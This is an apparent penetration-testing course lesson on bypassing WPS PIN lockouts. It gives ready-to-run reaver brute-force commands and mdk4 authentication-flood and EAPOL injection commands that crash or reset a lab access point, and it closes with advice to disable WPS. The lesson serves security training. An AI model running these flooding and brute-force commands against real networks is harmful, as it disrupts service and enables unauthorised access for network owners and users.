
<h1>Crashing a Target AP with MDK4</h1>
<hr/>
<p>During our efforts of retrieving the PIN and WPA-PSK, we are likely to encounter an access point locking at some point. In this section, we will demonstrate how flooding and crashing the AP can be used as a potential bypass.</p>
<p>There are a few different kinds of WPS locks, one of which is a delay period that occurs after too many incorrect guesses. As we demonstrated in an earlier section, we can bypass this using our advanced command, specifying the sleep period and time between attempts:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
</code></pre>
<p>The second kind of WPS lock is one that requires the AP to be reset, either through a power cycle or some other means, after too many incorrect PIN attempts. This can dissuade us as attackers from continuing WPS PIN retrieval techniques. However, <code>Authentication Denial-of-Service</code> and <code>EAPOL Start and Logoff</code> packet injection flooding attacks can grant us this access point reset. In some cases, this will remove the WPS lock. It is worth noting that not all access points are vulnerable to these two aggressive techniques, and <code>these techniques are truly a last resort</code>. In some instances, the access point will crash, while the WPS lock remains enabled.</p>
<h4>Bypassing the WPS Reset Lock through MDK4</h4>
<p>To begin this technique, we will need three terminals. In the first terminal, we will initiate the online bruteforcing attempt against the PIN.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
</code></pre>
<p>In the second terminal, we can monitor our <code>WPS Locked</code> status with <code>airodump-ng</code> and the <code>--wps</code> filter. We also specify our BSSID and channel, to exclude any additional access points from our list.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon

CH 11 ][ Elapsed: 0 s ][ 2023-01-02 23:29 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 60:38:E0:XX:XX:XX  -52   0       14        0    0  11   65   WPA2 CCMP   PSK Locked  HTB-Wireless    
</code></pre>
<p>Suppose our access point displays a locked status. This will halt all PIN attempts occurring in the first terminal. Luckily, <a href="https://github.com/aircrack-ng/mdk4">MDK4</a> includes functionality in its attack modules for both Authentication Denial-of-Service and EAPOL Start and Logoff Packet Injection flooding. In our third terminal, we can employ the following command to test for Authentication Denial-of-Service flooding. We specify attack module <code>a</code> for <code>Authentication Denial-of-Service</code>, and our access point's MAC address with <code>-a</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo mdk4 wlan0mon a -a 60:38:E0:XX:XX:XX

Connecting Client BC:AC:DC:23:D1:31 to target AP 60:38:E0:XX:XX:XX
Packets sent:      1 - Speed:    1 packets/sec
Connecting Client 84:24:10:39:FD:D1 to target AP 60:38:E0:XX:XX:XX
Packets sent:   1618 - Speed: 1617 packets/sec
Connecting Client 8D:D3:44:A8:23:6B to target AP 60:38:E0:XX:XX:XX
</code></pre>
<p><code>Authentication Denial-Of-Service</code> attacks will continue to spoof MAC addresses to authenticate to the network. This floods the access point's client list, and in many cases causes the access point to crash, thus resetting it. This can enable us to redeem an unlocked WPS status.</p>
<p>Alternatively, we could attempt this same attack with the <code>Intelligent Test</code> on the access point. The <a href="https://manpages.debian.org/bookworm/mdk4/mdk4.2.en.html#i~2">Intelligent Test</a> connects clients against the AP and reinjects sniffed data to keep them alive.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo mdk4 wlan0mon a -i 60:38:E0:XX:XX:XX
</code></pre>
<p>If our access point is still displaying a locked status in our second terminal, we could then attempt an <code>EAPOL Start and Logoff Packet Injection</code> attack.</p>
<p>In the third terminal, we have our choice of <code>EAPOL Start</code> or <code>EAPOL Logoff</code> messages. To use <code>EAPOL Start</code> messages, we run the following command.</p>
<pre><code class="language-shell-session">[!bash!]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX
</code></pre>
<p>To use <code>EAPOL Logoff</code> messages to kick clients off the network, we can employ the command seen below.</p>
<pre><code class="language-shell-session">[!bash!]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX -l
</code></pre>
<p>Alternatively, we could leave our <code>EAPOL Start</code> message MDK4 command running in our third terminal and begin the <code>EAPOL Logoff</code> messages in a fourth terminal. We can also utilize a deauthentication attack to kick clients.</p>
<p>By this point, our target access point should have crashed or reset if it is vulnerable to either of these DOS attacks. We can check on this in our second terminal through the <code>airodump-ng</code> output.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon

CH 11 ][ Elapsed: 0 s ][ 2023-01-02 23:29 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 60:38:E0:XX:XX:XX  -52   0       14        0    0  11   65   WPA2 CCMP   PSK Label  HTB-Wireless    
</code></pre>
<p>If all goes well, and our access point is reset, our Reaver session in the first terminal should be able to continue. This whole process could be scripted to take away from the need to manually crash the access point every time a lock is incurred. The general idea stays the same. Although this method is proven to cause resets among access points, it creates a noticeable amount of undesired detection for a penetration tester. If we need to keep a low profile, these Denial-of-Service methods would not be a good way to go.</p>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> Crashing a target access point (AP) with MDK4 is a method that only works on very old routers. Recent routers are not vulnerable to this type of Denial-of-Service (DoS) attack.
</div>
<hr/>
<h2>Closing Thoughts</h2>
<p>The importance of securing WPS devices cannot be overstated. As technology continues to evolve, so do the methods and tools used by cybercriminals to exploit vulnerabilities. WPS, being an older protocol, is particularly susceptible to attacks and should be disabled to enhance security. By understanding the risks associated with WPS and implementing robust security measures, such as using strong passwords, regularly updating firmware, and employing advanced encryption methods, we can significantly reduce the likelihood of unauthorized access and protect our wireless networks. Whether you're a seasoned cybersecurity professional or just beginning your journey, staying informed and vigilant is key to safeguarding your digital environment. Remember, a proactive approach to security is always more effective than a reactive one.</p>
